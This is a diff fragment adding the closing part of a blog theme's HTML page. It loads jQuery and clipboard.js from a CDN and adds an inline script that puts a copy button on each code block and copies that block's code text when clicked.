+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
